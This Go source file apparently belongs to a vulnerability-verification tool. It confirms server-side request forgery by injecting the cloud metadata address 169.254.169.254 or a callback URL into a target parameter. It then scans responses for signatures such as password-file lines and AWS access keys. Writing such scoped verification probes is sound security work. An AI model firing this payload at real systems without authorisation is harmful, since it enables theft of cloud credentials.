package verify

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/srank/ensphere/internal/evidence"
)

// SSRFConfig holds configuration for SSRF verification.
type SSRFConfig struct {
	URL         string
	Param       string
	CallbackURL string // optional external callback URL
	Method      string // GET or POST
	ProbeConfig
}

// Internal metadata signatures that indicate SSRF success.
var internalSignatures = []string{
	"latest/meta-data",
	"computeMetadata",
	"metadata/instance",
	"127.0.0.1",
	"root:x:0:0",
	"AWS_ACCESS_KEY",
}

// VerifySSRF runs the SSRF verification probe.
func VerifySSRF(cfg SSRFConfig) (*VerifyResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	// Baseline: inject a safe external URL
	throttle.Wait()
	probeCount++
	baselineResp := ssrfProbeWithParam(cfg, "https://example.com")
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d hash=%s\n", baselineResp.StatusCode, baselineResp.BodyHash[:16])
	writeEvidence(ew, "ssrf", "metadata_access", cfg.URL, cfg.Param, baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "injected https://example.com")

	// Probe: inject internal URL or callback
	probeURL := "http://169.254.169.254/latest/meta-data/"
	if cfg.CallbackURL != "" {
		probeURL = cfg.CallbackURL
	}

	throttle.Wait()
	probeCount++
	probeResp := ssrfProbeWithParam(cfg, probeURL)
	if probeResp.Error != nil {
		return nil, fmt.Errorf("ssrf probe: %w", probeResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[PROBE] status=%d hash=%s\n", probeResp.StatusCode, probeResp.BodyHash[:16])
	writeEvidence(ew, "ssrf", "metadata_access", cfg.URL, cfg.Param, probeResp.StatusCode,
		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("injected %s", probeURL))

	// Check for internal content signatures
	internalContent := false
	for _, sig := range internalSignatures {
		if strings.Contains(probeResp.Body, sig) {
			internalContent = true
			break
		}
	}

	responseDiff := baselineResp.BodyHash != probeResp.BodyHash

	var status, confidence, evidenceStr string
	if internalContent {
		status = "confirmed"
		confidence = "high"
		evidenceStr = fmt.Sprintf("Internal content signatures detected in response to %s", probeURL)
	} else if responseDiff {
		status = "potential"
		confidence = "medium"
		evidenceStr = "Response differs between baseline and SSRF probe — server may be following URLs"
	} else {
		status = "safe"
		confidence = "high"
		evidenceStr = "No response difference or internal content detected"
	}

	return &VerifyResult{
		Status:     status,
		VulnType:   "ssrf",
		Technique:  "metadata_access",
		Confidence: confidence,
		Evidence:   evidenceStr,
		Details: SSRFDetails{
			CallbackHit:     cfg.CallbackURL != "" && responseDiff,
			ResponseDiff:    responseDiff,
			InternalContent: internalContent,
			CallbackURL:     cfg.CallbackURL,
			BaselineHash:    baselineResp.BodyHash,
			ProbeHash:       probeResp.BodyHash,
			PayloadUsed:     probeURL,
		},
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
	}, nil
}

// ssrfProbeWithParam injects a URL value into the target parameter.
func ssrfProbeWithParam(cfg SSRFConfig, value string) ProbeResponse {
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		return ProbeResponse{Error: fmt.Errorf("parse URL: %w", err)}
	}

	params := parsed.Query()
	params.Set(cfg.Param, value)
	parsed.RawQuery = params.Encode()

	return HTTPProbe(cfg.Method, parsed.String(), "", cfg.Headers, cfg.TimeoutSec)
}
